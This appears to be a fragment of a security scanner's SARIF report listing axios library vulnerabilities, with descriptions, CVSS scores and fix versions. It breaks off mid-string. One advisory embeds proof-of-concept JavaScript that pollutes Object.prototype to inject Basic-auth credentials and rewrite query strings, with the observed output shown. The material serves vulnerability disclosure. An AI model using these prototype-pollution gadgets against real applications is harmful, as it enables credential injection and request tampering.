+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-62718",
+              "help": {
+                "text": "Vulnerability CVE-2025-62718\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.0, 0.31.0\nLink: [CVE-2025-62718](https://avd.aquasec.com/nvd/cve-2025-62718)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.",
+                "markdown": "**Vulnerability CVE-2025-62718**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.0, 0.31.0|[CVE-2025-62718](https://avd.aquasec.com/nvd/cve-2025-62718)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 4.8,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "cvssv40_baseScore": 6.3,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+                "precision": "very-high",
+                "security-severity": "4.8",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-40175",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Remote Code Execution via Prototype Pollution escalation"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Versions prior to 1.15.0 and 0.3.1 are vulnerable to a specific gadget-style attack chain in which prototype pollution in a third-party dependency may be leveraged to inject unsanitized header values into outbound requests. This vulnerability is fixed in 1.15.0 and 0.3.1."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-40175",
+              "help": {
+                "text": "Vulnerability CVE-2026-40175\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.0, 0.31.0\nLink: [CVE-2026-40175](https://avd.aquasec.com/nvd/cve-2026-40175)\nAxios is a promise based HTTP client for the browser and Node.js. Versions prior to 1.15.0 and 0.3.1 are vulnerable to a specific gadget-style attack chain in which prototype pollution in a third-party dependency may be leveraged to inject unsanitized header values into outbound requests. This vulnerability is fixed in 1.15.0 and 0.3.1.",
+                "markdown": "**Vulnerability CVE-2026-40175**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.0, 0.31.0|[CVE-2026-40175](https://avd.aquasec.com/nvd/cve-2026-40175)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Versions prior to 1.15.0 and 0.3.1 are vulnerable to a specific gadget-style attack chain in which prototype pollution in a third-party dependency may be leveraged to inject unsanitized header values into outbound requests. This vulnerability is fixed in 1.15.0 and 0.3.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 4.8,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "precision": "very-high",
+                "security-severity": "4.8",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42034",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Denial of Service via oversized streamed uploads bypassing body limits"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, for stream request bodies, maxBodyLength is bypassed when maxRedirects is set to 0 (native http/https transport path). Oversized streamed uploads are sent fully even when the caller sets strict body limits. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42034",
+              "help": {
+                "text": "Vulnerability CVE-2026-42034\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42034](https://avd.aquasec.com/nvd/cve-2026-42034)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, for stream request bodies, maxBodyLength is bypassed when maxRedirects is set to 0 (native http/https transport path). Oversized streamed uploads are sent fully even when the caller sets strict body limits. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42034**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.1, 0.31.1|[CVE-2026-42034](https://avd.aquasec.com/nvd/cve-2026-42034)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, for stream request bodies, maxBodyLength is bypassed when maxRedirects is set to 0 (native http/https transport path). Oversized streamed uploads are sent fully even when the caller sets strict body limits. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 5.3,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                "precision": "very-high",
+                "security-severity": "5.3",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42036",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Denial of Service via unbounded stream consumption when 'responseType: 'stream'' is used"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when responseType: 'stream' is used, Axios returns the response stream without enforcing maxContentLength. This bypasses configured response-size limits and allows unbounded downstream consumption. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42036",
+              "help": {
+                "text": "Vulnerability CVE-2026-42036\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42036](https://avd.aquasec.com/nvd/cve-2026-42036)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when responseType: 'stream' is used, Axios returns the response stream without enforcing maxContentLength. This bypasses configured response-size limits and allows unbounded downstream consumption. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42036**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.1, 0.31.1|[CVE-2026-42036](https://avd.aquasec.com/nvd/cve-2026-42036)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when responseType: 'stream' is used, Axios returns the response stream without enforcing maxContentLength. This bypasses configured response-size limits and allows unbounded downstream consumption. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 5.3,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                "precision": "very-high",
+                "security-severity": "5.3",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42038",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Information disclosure due to `no_proxy` bypass"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, he fix for no_proxy hostname normalization bypass is incomplete. When no_proxy=localhost is set, requests to 127.0.0.1 and [::1] still route through the proxy instead of bypassing it. The shouldBypassProxy() function does pure string matching — it does not resolve IP aliases or loopback equivalents. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42038",
+              "help": {
+                "text": "Vulnerability CVE-2026-42038\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42038](https://avd.aquasec.com/nvd/cve-2026-42038)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, he fix for no_proxy hostname normalization bypass is incomplete. When no_proxy=localhost is set, requests to 127.0.0.1 and [::1] still route through the proxy instead of bypassing it. The shouldBypassProxy() function does pure string matching — it does not resolve IP aliases or loopback equivalents. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42038**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.1, 0.31.1|[CVE-2026-42038](https://avd.aquasec.com/nvd/cve-2026-42038)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, he fix for no_proxy hostname normalization bypass is incomplete. When no_proxy=localhost is set, requests to 127.0.0.1 and [::1] still route through the proxy instead of bypassing it. The shouldBypassProxy() function does pure string matching — it does not resolve IP aliases or loopback equivalents. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 6.8,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N",
+                "precision": "very-high",
+                "security-severity": "6.8",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42039",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Node.js: Axios: Denial of Service via unbounded recursion in toFormData with deeply nested request data"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, toFormData recursively walks nested objects with no depth limit, so a deeply nested value passed as request data crashes the Node.js process with a RangeError. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42039",
+              "help": {
+                "text": "Vulnerability CVE-2026-42039\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42039](https://avd.aquasec.com/nvd/cve-2026-42039)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, toFormData recursively walks nested objects with no depth limit, so a deeply nested value passed as request data crashes the Node.js process with a RangeError. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42039**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.1, 0.31.1|[CVE-2026-42039](https://avd.aquasec.com/nvd/cve-2026-42039)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, toFormData recursively walks nested objects with no depth limit, so a deeply nested value passed as request data crashes the Node.js process with a RangeError. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "cvssv40_baseScore": 6.9,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42041",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Authentication bypass due to prototype pollution of HTTP error handling"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any Object.prototype pollution to silently suppress all HTTP error responses (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling. The root cause is that validateStatus is the only config property using the mergeDirectKeys merge strategy, which uses JavaScript's in operator — an operator that inherently traverses the prototype chain. When Object.prototype.validateStatus is polluted with () => true, all HTTP status codes are accepted as success. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42041",
+              "help": {
+                "text": "Vulnerability CVE-2026-42041\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42041](https://avd.aquasec.com/nvd/cve-2026-42041)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any Object.prototype pollution to silently suppress all HTTP error responses (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling. The root cause is that validateStatus is the only config property using the mergeDirectKeys merge strategy, which uses JavaScript's in operator — an operator that inherently traverses the prototype chain. When Object.prototype.validateStatus is polluted with () => true, all HTTP status codes are accepted as success. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42041**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.1, 0.31.1|[CVE-2026-42041](https://avd.aquasec.com/nvd/cve-2026-42041)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any Object.prototype pollution to silently suppress all HTTP error responses (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling. The root cause is that validateStatus is the only config property using the mergeDirectKeys merge strategy, which uses JavaScript's in operator — an operator that inherently traverses the prototype chain. When Object.prototype.validateStatus is polluted with () => true, all HTTP status codes are accepted as success. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 4.8,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "precision": "very-high",
+                "security-severity": "4.8",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42042",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: XSRF token bypass leading to information disclosure"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the withXSRFToken config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (isURLSameOrigin) is short-circuited, causing XSRF tokens to be sent to all request targets including cross-origin servers controlled by an attacker. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42042",
+              "help": {
+                "text": "Vulnerability CVE-2026-42042\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42042](https://avd.aquasec.com/nvd/cve-2026-42042)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the withXSRFToken config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (isURLSameOrigin) is short-circuited, causing XSRF tokens to be sent to all request targets including cross-origin servers controlled by an attacker. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42042**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.15.1, 0.31.1|[CVE-2026-42042](https://avd.aquasec.com/nvd/cve-2026-42042)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the withXSRFToken config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (isURLSameOrigin) is short-circuited, causing XSRF tokens to be sent to all request targets including cross-origin servers controlled by an attacker. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 5.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+                "precision": "very-high",
+                "security-severity": "5.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-44490",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Information disclosure and denial of service due to prototype pollution"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, axios exposes two read-side prototype-pollution gadgets. When Object.prototype is polluted by an upstream dependency in the same process (e.g. lodash _.merge / CVE-2018-16487), axios silently picks up the polluted values. (1) lib/utils.js line 406 builds merge()'s accumulator as result = {}, so result[targetKey] (line 414) walks Object.prototype and the polluted bucket's own keys are copied into the merged headers and ride out on the wire. (2) lib/core/mergeConfig.js line 26 builds the hasOwnProperty descriptor as a plain-object literal. Object.defineProperty reads descriptor.get/descriptor.set via the prototype chain, so a polluted Object.prototype.get or Object.prototype.set makes the call throw TypeError synchronously on every axios request. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-44490",
+              "help": {
+                "text": "Vulnerability CVE-2026-44490\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44490](https://avd.aquasec.com/nvd/cve-2026-44490)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, axios exposes two read-side prototype-pollution gadgets. When Object.prototype is polluted by an upstream dependency in the same process (e.g. lodash _.merge / CVE-2018-16487), axios silently picks up the polluted values. (1) lib/utils.js line 406 builds merge()'s accumulator as result = {}, so result[targetKey] (line 414) walks Object.prototype and the polluted bucket's own keys are copied into the merged headers and ride out on the wire. (2) lib/core/mergeConfig.js line 26 builds the hasOwnProperty descriptor as a plain-object literal. Object.defineProperty reads descriptor.get/descriptor.set via the prototype chain, so a polluted Object.prototype.get or Object.prototype.set makes the call throw TypeError synchronously on every axios request. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+                "markdown": "**Vulnerability CVE-2026-44490**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.16.0, 0.32.0|[CVE-2026-44490](https://avd.aquasec.com/nvd/cve-2026-44490)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, axios exposes two read-side prototype-pollution gadgets. When Object.prototype is polluted by an upstream dependency in the same process (e.g. lodash _.merge / CVE-2018-16487), axios silently picks up the polluted values. (1) lib/utils.js line 406 builds merge()'s accumulator as result = {}, so result[targetKey] (line 414) walks Object.prototype and the polluted bucket's own keys are copied into the merged headers and ride out on the wire. (2) lib/core/mergeConfig.js line 26 builds the hasOwnProperty descriptor as a plain-object literal. Object.defineProperty reads descriptor.get/descriptor.set via the prototype chain, so a polluted Object.prototype.get or Object.prototype.set makes the call throw TypeError synchronously on every axios request. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 4.8,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+                "precision": "very-high",
+                "security-severity": "4.8",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-7q8q-rj6j-mhjq",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Axios: Nested axios option objects can consume polluted prototype values"
+              },
+              "fullDescription": {
+                "text": "## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request is affected. Requests that do not pass `auth`, do not pass `paramsSerializer`, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.\n\n## Affected Functionality\n\nAffected runtime functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser/fetch/XHR Basic auth handling through `lib/helpers/resolveConfig.js`.\n- Query serialization through `lib/helpers/buildURL.js`.\n- `axios.getUri()` when called with an affected `paramsSerializer` object.\n\nAffected config shapes:\n\n- `auth: {}` or an `auth` object missing own `username` and/or `password`.\n- `paramsSerializer: {}` or a `paramsSerializer` object missing own `encode` and/or `serialize`.\n\nUnaffected by this specific issue:\n\n- Requests with no `auth` property.\n- Requests with no `paramsSerializer` property.\n- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:\n\n```js\n} else if (utils.isPlainObject(source)) {\n  return utils.merge({}, source);\n}\n```\n\nDownstream code then reads nested fields without own-property checks.\n\nIn `lib/helpers/resolveConfig.js`:\n\n```js\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n```\n\nIn `lib/adapters/http.js`:\n\n```js\nconst username = configAuth.username || '';\nconst password = configAuth.password || '';\nauth = username + ':' + password;\n```\n\nIn `lib/helpers/buildURL.js`:\n\n```js\nconst _encode = (options && options.encode) || encode;\nconst serializeFn = _options && _options.serialize;\n```\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst user = 'attacker';\nconst pass = 'exfil';\n\nObject.defineProperty(Object.prototype, 'username', {\n  value: user,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'password', {\n  value: pass,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true\n});\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify({\n    authorization: req.headers.authorization || null,\n    url: req.url\n  }));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n  const port = server.address().port;\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored' }\n  });\n\n  console.log(response.data);\n} finally {\n  await new Promise((resolve) => server.close(resolve));\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\nObserved result:\n\n```json\n{\n  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",\n  \"url\": \"/demo?polluted=1\"\n}\n```\n\n## Workarounds\n\nIf upgrading is not yet possible, avoid passing placeholder nested option objects.\n\nRemove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.\n\nThese workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. \n\n### Details\nmergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:\n\nmergeConfig.js Lines 36-45\n\n```\n  function getMergedValue(target, source, prop, caseless) {\n    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {\n      return utils.merge.call({ caseless }, target, source);\n    } else if (utils.isPlainObject(source)) {\n      return utils.merge({}, source);\n    } else if (utils.isArray(source)) {\n      return source.slice();\n    }\n    return source;\n  }\n```\n\nThe cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:\n\nBrowser / fetch Basic auth — lib/helpers/resolveConfig.js:\nresolveConfig.js Lines 64-70\n```\n  if (auth) {\n    headers.set(\n      'Authorization',\n      'Basic ' +\n        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n    );\n  }\n```\n\nNode HTTP adapter Basic auth — lib/adapters/http.js:\nhttp.js Lines 829-836\n```\n      // HTTP basic authentication\n      let auth = undefined;\n      const configAuth = own('auth');\n      if (configAuth) {\n        const username = configAuth.username || '';\n        const password = configAuth.password || '';\n        auth = username + ':' + password;\n      }\n```\n\nparamsSerializer reads — lib/helpers/buildURL.js:\nbuildURL.js Lines 31-54\n```\nexport default function buildURL(url, params, options) {\n  if (!params) {\n    return url;\n  }\n  const _encode = (options && options.encode) || encode;\n  const _options = utils.isFunction(options)\n    ? {\n        serialize: options,\n      }\n    : options;\n  const serializeFn = _options && _options.serialize;\n  let serializedParams;\n  if (serializeFn) {\n    serializedParams = serializeFn(params, _options);\n  } else {\n    serializedParams = utils.isURLSearchParams(params)\n      ? params.toString()\n      : new AxiosURLSearchParams(params, _options).toString(_encode);\n  }\n```\n\nBecause auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.\n\nThe auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst ATTACKER_USER = 'attacker';\nconst ATTACKER_PASS = 'exfil';\nconst ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');\n\n// Step 1: simulate a pre-existing prototype-pollution primitive in this process.\n// In reality, a separate dependency would have done this. We keep the\n// \"polluted\" properties non-enumerable so they only affect inherited reads,\n// which is the realistic shape of most prototype-pollution gadgets.\nObject.defineProperty(Object.prototype, 'username', {\n  value: ATTACKER_USER,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'password', {\n  value: ATTACKER_PASS,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true,\n});\n\n// Local capture server.\nconst server = http.createServer((req, res) => {\n  const captured = {\n    authorization: req.headers['authorization'] || null,\n    url: req.url,\n  };\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify(captured));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\ntry {\n  // Application code: passes nested *placeholder* option objects that have\n  // no own auth/serializer properties. Without prototype pollution this is\n  // a no-op. With prototype pollution it becomes attacker-controlled state.\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored-by-polluted-serializer' },\n  });\n\n  console.log('--- PoC: nested-option prototype-pollution gadgets ---');\n  console.log('Server saw:', JSON.stringify(response.data));\n\n  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;\n  const urlRewritten = response.data.url === '/demo?polluted=1';\n\n  if (authLeaked && urlRewritten) {\n    console.log(\n      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +\n        'Object.prototype values into the outbound request.'\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: nested option objects did 